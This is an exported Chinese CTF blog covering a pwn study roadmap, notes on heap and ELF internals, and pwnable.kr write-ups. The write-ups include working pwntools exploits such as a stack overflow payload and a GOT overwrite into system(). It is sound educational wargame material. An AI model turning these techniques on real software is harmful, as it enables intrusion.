<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[知识点总结与学习资料整理]]></title>
    <url>%2F2019%2F02%2F19%2F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[知识点总结：在学长的帮助和自己对安全知识的好奇之下入坑ctf，转眼间到现在已经有四个月了（一月因为要复习期末几乎荒废了），仔细想想这一路来除了某些时候学长和bg的激励和鞭策让我知道自己很菜之外，大部分时间还是靠自己的兴趣去学习的，这一点让我觉得还行，起码没有违背我在大学之前定的人生目标！！菜鸡有菜鸡的活法！！！QAQ 到现在为止，除了python沙箱逃逸，linux内核和虚拟机逃逸这几块比较复杂的地方之外，已经知识点大部分学完了，题目有的地方刷了一点，有的地方没刷，但原理已经都能明白并且例题都跟着做了一遍。寒假也快结束了，想在这里记录一下自己学习的历程以及一些知识点的整理，后面的部分还会有资料整理。 前提准备：工具： ubuntu虚拟机 IDA pro用于静态调试 gdb用于动态调试以及peda插件，pwntools模块 vim编辑器 知识： 汇编基础语法 python基础语法 c语言较扎实（特别是指针和链表这一块） linux基本命令 第一阶段：pwnable.kr的第一部分：这一阶段主要的目的是了解pwn的题目形式，毕竟它和以往学的数学物理无论是学习还是做题形式都不一样，可能开始时都不会做，会毫无头绪直接看writeup，但是慢慢地就会习惯，找到套路，并且熟悉Linux的常用命令与怎么远程连接服务器，从远程服务器下载文件等基本功，等于是熟悉环境和题目大致形式的一个转变的过程。我的建议是在做完以后再自己独立地从头到尾地把exp整理一遍，确保自己能独立做出并理解其中的思想。 第二阶段：ctf-wiki与i春秋的体系学习：栈部分：分为以下几大块： 熟悉基本函数调用的栈的排布格局，理解leave，retn，call的意义，知道怎么算偏移，简称为基础栈溢出。 理解shellcode，在未开NX的情况下懂得利用shelllcode。 rop: 基础rop 带libc的rop brop stack pivot srop ret2_di_runtime_reslove ret2vsdo 在i春秋上有栈这一部分较完整的教程，且配有课后习题，比较好，配合wiki学习效果更佳，因为后来我发现看一篇文章很难理解一个技术，一般需要参考好几个。 格式化字符串部分： i春秋的第六篇文章说的很清楚，题目质量也不错，配合wiki学习三天就可以结束。 堆部分： 学习堆的内存管理机制（较重要！！！不理解后面都是扯淡） 堆漏洞： uaf，unlink，off-one-by 堆溢出： fastbin-attack: double free，house of sprit unsorted-attack house of lore house of force 还有几种house of XXX系列是比较新的技术，暂未学习，也很少出现。 第三阶段：专题刷题： 各个板块学习完以后的刷题，巩固知识点的理解。 第四阶段：综合刷题： 综合刷题，在不告诉你漏洞方向与漏洞点，没有提示的情况下独立做出来题目才是真本事。 资料整理：自己学了几个月了也收集了不少好的资料，在这里整理一下，一方面便于我自己使用，一方面整理一下我乱的书签。 学习： ctf-wiki在阶段比较全的成体系的资料之一 i春秋论坛上比较好的栈和格式化字符串的学习资料，配有课后习题，个人感觉质量比较好 （在左上角的搜索框里输入pwn入门就会出现10篇教程，一篇一篇看即可） 北京邮电大学瑶光战队学习资料 (比较全面，可以用来复习用) 看雪知识库 CTF-All-IN-ONE (一本即将出版的书，里面大部分都是pwn的内容，题目质量也比较高) 一个pwn的项目收集 在i春秋上搜pwn的网课，有一个Atum师傅的课，里面有不少资料和学习方法，推荐去看。 一些博客： 台湾angleboy的博客 不认识这位师傅，但是他很多文章写得很好 深入理解计算机系统浓缩总结 刷题： 2018比赛题目收集 ctf-wiki里的题目 pwnable.kr pwnable.tw Jarvis oj ctf-all-in-one里的题目 shellcode收集站： shell-storm.org 还有很多小的资料都是在以上列举的这些大资料里的，就不一一列举。 继续学习去了，今天任务还没完成！！ （希望再过多年以后还能凭着自己内心的热爱为安全事业贡献一份力。。]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[堆的理论知识学习]]></title>
    <url>%2F2019%2F02%2F13%2F%E5%A0%86%E7%9A%84%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近花了两天时间上网查阅资料学习了堆的内存管理模式，找到了几篇还不错的文章，在此分享一下： Linux堆内存管理深入分析上 Linux堆内存管理深入分析下 PWN之堆内存管理 申请内存块 看雪的求助 较详细的内存分配过程 这几篇文章讲的已经比较详细，基础的东西我就不再赘述，只是总结一下我自己的一些心得和理解： 所谓堆的内存管理模式看起来比较复杂，主要原因是知识点较多，引入新的结构体和新函数比较多，让人一下子不能理解地那么深，或者说记忆不了那么多，耐心多看几遍就会好很多，需要一定的时间沉淀。 主要内容有三点： 一是几种结构体的介绍：malloc_state， malloc_chunk，heap_info，和chunk的结构 ||| fast_bins，small_bins，large_bins，unsorted_bin。 二是arena的介绍，多线程堆是如何管理的，malloc中mmap和brk的区别，main_arena和thread_arena的区别。（这一点在第一篇文章有详细介绍） 三是内存的分配与回收（最后一篇文章较详细），这一点最难也最重要，又全部围绕怎么让这个过程变得高效来设计（主要在于large chunk的分配需要进行碎片合并和整理的大循环）： 当malloc(size)的时候，先进行一部分处理和加锁后，开始正式分配，先看size的大小，如果在fast_bins之内，就先遍历fast_bins中有没有正好适合的chunk有的话分配后返回，没有的话或者size的大小大于64bytes小于512sizes则进入small_bins寻找，找到合适的返回，没有的话或者size大小大于512bytes属于large chunk，大循环开始，开始对fast_bins里的碎片开始整理和合并，物理地址相连的chunk合并以后放进unsorted_bin里，不能合并的直接放进unsorted_bins里，然后对unsorted_bin中的chunk从其尾指针指向的chunk开始（FIFO算法）进行遍历，if(大小刚好符合) {取出分配返回} else {将其放入对应的bin中，这个过程结束会将fast_bins和unsorted_bins清空}，遍历完成后再看last remainder chunk，其大小大于size时切割然后unsorted_bin的尾指针指向新的last remainder chunk，并更新储存其数据内容的结构。。。。 内容太多，直接看最后一篇文章吧QAQ。 orz]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制方面知识扩充]]></title>
    <url>%2F2019%2F01%2F28%2F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%B9%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%89%A9%E5%85%85%2F</url>
    <content type="text"><![CDATA[PIE和ASLR：参考链接：对PIE和ASLR的理解 首先，ASLR的是操作系统的功能选项，作用于executable（ELF）装入内存运行时，因而只能随机化stack、heap、libraries的基址；而PIE（Position Independent Executables）是编译器（gcc，..）功能选项（-fPIE），作用于excutable编译过程，可将其理解为特殊的PIC（so专用，Position Independent Code），加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。 PIE只是在编译的过程中赋予了ELF加载到内存时其加载基址随机化的功能，也就是说PIE编译出来的ELF如果在ASLR=0的情况下，ELF的加载基址也是不会变的。 所以这是ASLR 的三个级别变成了 ：0， 不开启任何随机化；1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化；2，开启heap随机化。 因而，我们会发现PIE编译出来的executable如果ASLR=0的话，基址也是不会变的（有能力但没使用），如果ASLR=1的话，即使按照ASLR定义这个级别似乎不会对heap基址随机化，但是由于executable的基址已经随机化了，所以heap的基址自然也就被随机化了：） ELF文件的结构：参考链接：参考 elf文件分三种类型： 1、目标文件（通常是.o); 2、可执行文件(我们的运行文件) 3、动态库(.so) ​ 我们先讲一下可执行文件。 ​ 可执行文件一般分成4个部分，能扩展，我们理解这4部分就够了。 ​ 1. elf文件头 ，这个文件是对elf文件整体信息的描述，在32位系统下是56的字节，在64位系统下是64个字节。 对于可执行文件来说，文件头包含的一下信息与进程启动相关 e_entry 程序入口地址 e_phoff segment偏移 e_phnum segment数量 ​ 2. segment表， 这个表是加载指示器，操作系统（确切的说是加载器，有些elf文件，比如操作系统内核，是由其他程序加载的）,该表的结构非常重要。 typedef struct { Elf64_Word p_type; / Segment type / Elf64_Word p_flags; / Segment flags / /*segment权限，6表示可读写，5表示可读可执行 Elf64_Off p_offset; / Segment file offset / /段在文件中的偏移/ Elf64_Addr p_vaddr; / Segment virtual address / /*虚拟内存地址，这个表示内存中的 Elf64_Addr p_paddr; / Segment physical address /物理内存地址，对应用程序来说，这个字段无用*/ Elf64_Xword p_filesz; / Segment size in file / /段在文件中的长度/ Elf64_Xword p_memsz; / Segment size in memory / /在内存中的长度，一般和p_filesz的值一样*/ Elf64_Xword p_align; / Segment alignment / / 段对齐/ } Elf64_Phdr; ​ 3. elf的主题，对于可执行文件来说，最主要的就是数据段和代码段 ​ 4. section表，对可执行文件来说，没有用，在链接的时候有用，是对代码段数据段在链接是的一种描述。 ​ 整个elf文件的组成可以使用下图来描述: ELF文件的载入和运行及动态链接：参考链接:重读《深入理解计算机系统》 运行地址也就是链接地址。实际上指的是，程序在运行过程中，该指令对应的内存地址。 我们再回到本系列的主题：程序的加载和运行。可执行程序生成之后，是保存在硬盘中的，当用户执行该程序的时候，该程序会被加载器按照program header table的描述将程序的代码段和数据段从硬盘加载到内存中。在使用MMU的机器上，CPU处理的地址是虚拟地址。同样的，加载到内存中的地址指的也是虚拟地址。由于虚拟内存的抽象，每个进程都认为其独占内存，因此，每个可执行程序总是可以被加载到相同的内存地址（虚拟地址），其实，这些内存地址都是位于各个可执行程序独自的内存空间的地址。但是，对于MMU来讲，这些相同的虚拟地址其实对应了不同的物理地址。而对于CPU来讲，指令是按照其虚拟地址一条条的被加载到CPU中运行的。 如上所述，加载器是按照program header table的描述来给程序代码段分配指令地址的。具体的过程如下： 还记得我们在可执行文件详解中segment和section的对应关系吧？每个section按照这个mapping表顺序排列构成了不同的segment。其中第2个segment就是可执行文件的代码段。代码段中第一个section是.interp，其起始地址是0x400238，然后，加上.interp section的大小，就是下一个section .note.ABI-tag的起始地址。依次类推，对于可执行文件详解中的可执行文件add来讲，其.text的起始地址就是0x400430。 为什么对于X86_64架构来讲，所有可执行文件的text segment的起始地址都是0x400000? 实际上是链接脚本规定的，在链接过程中，链接器会根据链接脚本的描述来构建可执行文件。对于X86_64来讲，其默认的链接脚本位于/usr/lib/ldscripts/elf_x86_64.x。在其中我们发现这句话：__executable_start = SEGMENT_START(&quot;text-segment&quot;, 0x400000))它指定了可执行的text segment应起始于0x400000。 根据上述objdump -d的输出，.text的第一个函数是_start，因此，_start的第一条指令地址就是0x400430。后面每个函数的地址等于它的上一个函数的地址加上该函数自身的字节数。这样，完成了给每个函数重定位（分配运行地址）的过程。 函数中的每条指令的地址的重定位类似于函数重定位。函数的首地址即是第一条指令的首地址，后面每条指令的地址依次等于上一条指令的地址加上该指令的字节数。回忆编译过程分析中，在编译完成后，指令引用外部符号时，生成了对应的操作数和符号的占位符，此时，对于除动态链接库的符号外，其他的符号都已经有了确定的地址。因此，结合符号表我们就可以将类似的指令完成重定位。 比如在本例中，对于main函数来讲，调用了两个外部函数add和printf，根据上面信息，add函数相关的代码已经确定在0x400526处。因此，该地址就是call指令的调用add的操作数。而上述代码显示的400400处似乎并非是printf函数真正的实现。没错，这是因为printf函数是属于libc的库函数，但是，我们知道对于动态链接来讲，在生成可执行文件时，并未将它所依赖的动态库的代码复制过来，而只是复制了相关的重定位信息和符号表，所以，此时依然不能确定printf函数的地址。而400400处的内存值只是一个跳板，等程序运行时，动态链接器会将相关动态链接库的代码链接进来，修改这个跳板处对应的值，就可以让跳转指令正确的跳转到printf函数真正的内存地址处执行了。稍后我们将会对该过程做详细的分析。（涉及到PLT和GOT表的知识） 上篇文章我们提到，为了保证代码复用和节省计算机资源，在链接时，动态链接库的代码段和数据段等是不会被复制到最终生成的可执行文件中的，这些部分会在程序加载的时候复制到内存，并做动态链接，使原来可执行文件能够对其中定义的符号正常引用。也就是说在这个时候，可执行文件代码段中对动态链接库包含的符号引用的地址才真正确定下来。但是我们查看各个segment的属性可以知道，.text segment是只读的，也就是说在编译成可以执行文件之后，就不能被修改了，那么如何确保它能够正确的引用在加载时才能确定下来的动态链接库里的符号呢？这就需要我们这篇文章里的GOT和PLT作为跳板来实现了。 GOT全称Global Offset Table，即全局偏移量表。它在可执行文件中是一个单独的section，位于.data section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含正确的目标地址。 PLT全称Procedure Linkage Table，即过程链接表。它在可执行文件中也是一个单独的section，位于.textsection的前面。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目实际上都是一小段可执行的代码。]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr第一部分exp与思路]]></title>
    <url>%2F2018%2F12%2F26%2Fpwnable-kr%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86exp%E4%B8%8E%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[写这些没用的东西也没啥目的，除了回忆一下知识之外也就是练一下exp的书写，因为很多题没必要用exp所以那时候做就没练过。。。。。pwnable.kr第一部分确实很适合初学者做，大多为知识题，主要是强迫你去学知识，而且后面几题建立出一个基本框架，此外搭配jarvis.oj和ctf-wiki有体系的学习更好，完成这些再去pwnable.tw。。。 fd思路：1.有源码肯定先分析源码： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 2.题意简单明了：先找flag，发现当buf中装的是LETMEWIN时获得flag，回头找buf从何而来，发生了啥， read()中从fd文件符读32字节，fd即为文件操作符，只有当fd=0时我们才能通过输入控制，所以使argv[1]=’0x1234’ 即可。 exp： 12345from pwn import * s=ssh(host='pwnable.kr',user='fd',password='guest',port=2222)p=s.process(argv=['./fd','4660'],executable='./fd')p.sendline('LETMEWIN')p.interactive() collision思路：1. 有源码看源码： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; 先看代码结构：有两个函数，main()和check_password()，先看main()找到关于flag的语句，当hashcode等于将第二个参数传入check_password后的返回值时，拿到flag，hashcode已给出，分析check_password()即可，​ int* ip = (int*)p; 此句为理解关键，将char类型指针强转为int型，ip每加一移动4个字节，所以题意为将输入的20个字节的参数分为5组，累加后等于0x21dd09ec即可 计算器：0x01010101 * 4 +0x1dd905e8 = 0x21dd09ec （看网上说有坏字符的影响，但这么多数，随便选一个也可以了吧。。。。） exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='col',password='guest',port=2222)str=p32(0x01010101)*4 + p32(0x1dd905e8)p=s.process(argv=['./col',str],executable='./col')p.interactive() bof思路：1. 下载看源码： 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 这题是最基础的缓冲区溢出，只要对其有过一点研究的人都应该没什么问题，ctfwili上有全面详细的剖析，推荐自学参考 ctf-wiki 看完以后再做这个绝对没有问题 很明显对含有gets()的func()进行溢出，用overflowme覆盖key将key变成0xcafebabe exp: 12345from pwn import * s=remote('pwnable.kr',9000)payload='A'*0x34 + p32(0xcafebabe)s.sendline(payload)s.interactive() flag思路：1. 没给源码，只有elf文件，直接放进ida中，因为题目提示了This is reversing task. all you need is binary所以F5大法基本不管用了，再看其函数少的可怜（基本是加壳了），再看hex-view 机器码一行一行看时发现一句话 this file is packed with the UPX…….很明显，这题需要upx的知识储备，寻找谷歌百度 ，发现文件被Upx方式加壳，需要解壳。 先下载upx 然后在flag所在目录解壳flag,之后再把它放进ida中，看源码得知他要把flag复制进malloc()里，但是我们可以其实可以直接双击flag直接看注释得知flag…..可能是bug…. 或者在gdb里也可以直接在传递flag给rdx的指令后下个断点，然后在已字符串形式查看rdx的值即可。 passcode思路： 1. 老套路有源码看源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); system("/bin/cat flag"); &#125; else&#123; printf("Login Failed!\n"); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf("enter you name : "); scanf("%100s", name); printf("Welcome %s!\n", name);&#125;int main()&#123; printf("Toddler's Secure Login System 1.0 beta.\n"); welcome(); login(); // something after login... printf("Now I can safely trust you that you have credential :)\n"); return 0; &#125; 这题有点小难度：（首先应注意到welcome()和login()同在main()里且之间没有多余操作，所以他们ebp应该一样。）第一个思路是直接把system()的地址放进welcome()的ret里，后来发现name虽然限制了为100，但是name偏移了70H，失败。第二个思路是看passcode1和passcode2的地址，通过welcome中的name设计数据来控制他们的值：有两个地方行不通：1.passcode1与2与name的偏移大于100 。 2.passcode1为338150（0x000582E6），passcode2为13371337（0x00cc07c9）即可，然而且不论这两个地址是否是可写的，至少00字节的存在就因为截断而打消念想了。 所以这个时候问题就变得比较操蛋，需要查资料和新的东西了，通过调试理解plt和got表 诞生一种新方法，双重scanf()连续修改，在welcome()的scanf()利用name设计passcode1（需先确定passcode1的地址相对name的偏移）的值，将其值设为fflush()的got表地址，在login()的第一个scanf()向passcode1所指向的地址（Got表中原本写的是调用flush()指令的地址）改为调用system函数指令的地址，所以之后调用fflush()的时候就会调用system（）。 exp: 123456from pwn import *s=ssh(host='pwnable.kr',port=2222,user='passcode',password='guest')p=s.process('./passcode')payload='a'* 0x60 + '\x04\xa0\x04\x08' + '134514147'p.sendline(payload)p.interactive() exp需注意的地方：应数是输入给scanf 有固定格式，不能随便输入，例如%d只能为十进制整数，将134514147换成0x080485e3则不对。 random思路：1. 有源码 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf("%d", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf("Good!\n"); system("/bin/cat flag"); return 0; &#125; printf("Wrong, maybe you should try 2^32 cases.\n"); return 0;&#125; 明显看出rand()的种子为固定的，所以其值也为固定的值，自己写一个程序跑一下就可以得出其结果，然后用公式a或b=c，则a/b=c或b/a。用计算器得出答案。 exp: 12345from pwn import * s=ssh(host='pwnable.kr',user='random',port=2222,password='guest')p=s.process('./random')p.sendline('3039230856')p.interactive() input思路：1. 有源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123; printf("Welcome to pwnable.kr\n"); printf("Let's see if you know how to give input to program\n"); printf("Just give me correct inputs then you will get the flag :)\n"); // argv if(argc != 100) return 0; if(strcmp(argv['A'],"\x00")) return 0; if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0; printf("Stage 1 clear!\n"); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0; read(2, buf, 4); if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0; printf("Stage 2 clear!\n"); // env if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0; printf("Stage 3 clear!\n"); // file FILE* fp = fopen("\x0a", "r"); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0; fclose(fp); printf("Stage 4 clear!\n"); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1)&#123; printf("socket error, tell admin\n"); return 0; &#125; saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123; printf("bind error, use another port\n"); return 1; &#125; listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0)&#123; printf("accept error, tell admin\n"); return 0; &#125; if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0; printf("Stage 5 clear!\n"); // here's your flag system("/bin/cat flag"); return 0;&#125; 这题需要一些知识储备，包括socket通信，管道通信，环境变量的理解和简单运用，需要耐心一个一个知识点学习。 code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netdb.h&gt; void main()&#123; char *args[101]; int i; for(i=0;i&lt;100;i++)&#123; args[i]="A"; &#125; args['A']="\x00"; args['B']="\x20\x0a\x0d"; args['C']="5555"; args[100]=NULL; char* env[2]=&#123;"\xde\xad\xbe\xef=\xca\xfe\xba\xbe",NULL&#125;; int fd0[2]; int fd2[2]; pipe(fd0); pipe(fd2); FILE* fp = fopen("\x0a", "ab+"); fwrite("\x00\x00\x00\x00", 4, 1, fp); #define CHILD_READ0 fd0[0] #define PARENT_WRITE0 fd0[1] #define CHILD_READ2 fd2[0] #define PARENT_WRITE2 fd2[1] pid_t child; if((child=fork())&lt;0)&#123; printf("Error\n"); &#125;else if(child==0)&#123; close(PARENT_WRITE0); close(PARENT_WRITE2); dup2(CHILD_READ0,0); dup2(CHILD_READ2,2); close(CHILD_READ0); close(CHILD_READ2); execve("/home/input/input",args,env); &#125;else&#123; close(CHILD_READ0); close(CHILD_READ2); write(PARENT_WRITE0,"\x00\x0a\x00\xff",4); write(PARENT_WRITE2,"\x00\x0a\x02\xff",4); int sockfd, portno, n; struct sockaddr_in serv_addr; struct hostent *server; portno = atoi(args['C']); sockfd = socket(AF_INET, SOCK_STREAM, 0); server = gethostbyname("127.0.0.1"); bzero((char *) &amp;serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; bcopy((char *)server-&gt;h_addr, (char *)&amp;serv_addr.sin_addr.s_addr, server-&gt;h_length); serv_addr.sin_port = htons(portno); sleep(5); connect(sockfd,(struct sockaddr *) &amp;serv_addr,sizeof(serv_addr)); write(sockfd,"\xde\xad\xbe\xef",4); close(sockfd); &#125;&#125; leg思路: 1. 有源码，也给了汇编码，知识题（学习arm汇编知识）： 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1()&#123; asm("mov r3, pc\n");&#125;int key2()&#123; asm( "push &#123;r6&#125;\n" "add r6, pc, $1\n" "bx r6\n" ".code 16\n" "mov r3, pc\n" "add r3, $0x4\n" "push &#123;r3&#125;\n" "pop &#123;pc&#125;\n" ".code 32\n" "pop &#123;r6&#125;\n" );&#125;int key3()&#123; asm("mov r3, lr\n");&#125;int main()&#123; int key=0; printf("Daddy has very strong arm! : "); scanf("%d", &amp;key); if( (key1()+key2()+key3()) == key )&#123; printf("Congratz!\n"); int fd = open("flag", O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); &#125; else&#123; printf("I have strong leg :P\n"); &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879(gdb) disass mainDump of assembler code for function main: 0x00008d3c &lt;+0&gt;: push &#123;r4, r11, lr&#125; 0x00008d40 &lt;+4&gt;: add r11, sp, #8 0x00008d44 &lt;+8&gt;: sub sp, sp, #12 0x00008d48 &lt;+12&gt;: mov r3, #0 0x00008d4c &lt;+16&gt;: str r3, [r11, #-16] 0x00008d50 &lt;+20&gt;: ldr r0, [pc, #104] ; 0x8dc0 &lt;main+132&gt; 0x00008d54 &lt;+24&gt;: bl 0xfb6c &lt;printf&gt; 0x00008d58 &lt;+28&gt;: sub r3, r11, #16 0x00008d5c &lt;+32&gt;: ldr r0, [pc, #96] ; 0x8dc4 &lt;main+136&gt; 0x00008d60 &lt;+36&gt;: mov r1, r3 0x00008d64 &lt;+40&gt;: bl 0xfbd8 &lt;__isoc99_scanf&gt; 0x00008d68 &lt;+44&gt;: bl 0x8cd4 &lt;key1&gt; 0x00008d6c &lt;+48&gt;: mov r4, r0 0x00008d70 &lt;+52&gt;: bl 0x8cf0 &lt;key2&gt; 0x00008d74 &lt;+56&gt;: mov r3, r0 0x00008d78 &lt;+60&gt;: add r4, r4, r3 0x00008d7c &lt;+64&gt;: bl 0x8d20 &lt;key3&gt; 0x00008d80 &lt;+68&gt;: mov r3, r0 0x00008d84 &lt;+72&gt;: add r2, r4, r3 0x00008d88 &lt;+76&gt;: ldr r3, [r11, #-16] 0x00008d8c &lt;+80&gt;: cmp r2, r3 0x00008d90 &lt;+84&gt;: bne 0x8da8 &lt;main+108&gt; 0x00008d94 &lt;+88&gt;: ldr r0, [pc, #44] ; 0x8dc8 &lt;main+140&gt; 0x00008d98 &lt;+92&gt;: bl 0x1050c &lt;puts&gt; 0x00008d9c &lt;+96&gt;: ldr r0, [pc, #40] ; 0x8dcc &lt;main+144&gt; 0x00008da0 &lt;+100&gt;: bl 0xf89c &lt;system&gt; 0x00008da4 &lt;+104&gt;: b 0x8db0 &lt;main+116&gt; 0x00008da8 &lt;+108&gt;: ldr r0, [pc, #32] ; 0x8dd0 &lt;main+148&gt; 0x00008dac &lt;+112&gt;: bl 0x1050c &lt;puts&gt; 0x00008db0 &lt;+116&gt;: mov r3, #0 0x00008db4 &lt;+120&gt;: mov r0, r3 0x00008db8 &lt;+124&gt;: sub sp, r11, #8 0x00008dbc &lt;+128&gt;: pop &#123;r4, r11, pc&#125; 0x00008dc0 &lt;+132&gt;: andeq r10, r6, r12, lsl #9 0x00008dc4 &lt;+136&gt;: andeq r10, r6, r12, lsr #9 0x00008dc8 &lt;+140&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0 0x00008dcc &lt;+144&gt;: ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc 0x00008dd0 &lt;+148&gt;: andeq r10, r6, r4, asr #9End of assembler dump.(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push &#123;r6&#125; ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push &#123;r3&#125; 0x00008d0a &lt;+26&gt;: pop &#123;pc&#125; 0x00008d0c &lt;+28&gt;: pop &#123;r6&#125; ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump.(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push &#123;r11&#125; ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop &#123;r11&#125; ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) 易得题意为计算key1,key2,key3的值，然后输入他们的和即可。学习知识参考以下两个链接：arm速成 跳转指令基本用法 mistake思路：1. 有源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void 